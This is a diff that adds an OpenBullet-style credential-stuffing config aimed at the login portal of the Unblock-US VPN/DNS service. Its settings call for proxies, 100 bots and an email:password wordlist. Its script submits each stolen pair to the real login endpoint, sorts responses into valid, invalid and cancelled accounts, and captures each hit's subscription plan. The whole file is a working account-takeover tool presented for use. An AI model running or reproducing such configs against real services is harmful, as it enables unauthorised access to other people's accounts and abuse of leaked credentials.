@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "unblock-us",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-03T02:15:23.7194612+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic & Capture fixed by meinname",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQ_AUTH_TOKEN REQUEST GET "https://portal.unblock-us.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#LOGIN_(POST) REQUEST POST "https://portal.unblock-us.com/sessions" AutoRedirect=TRUE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TOKEN>&login%5Bpromo_code%5D=&login%5Bemail%5D=<USER>&login%5Bpassword%5D=<PASS>&login%5Bremember_me%5D=0&commit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://portal.unblock-us.com/sessions" 
+  HEADER "Origin: https://portal.unblock-us.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Email or password was invalid." 
+  KEYCHAIN Success OR 
+    KEY "My Account" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Cancelled" 
+    KEY "" 
+PARSE "<SOURCE>" LR "<h2>" "<div class=\"form-group hidden user_subs_plan_code" Recursive=FALSE -> CAP "PLAN" "" "" 
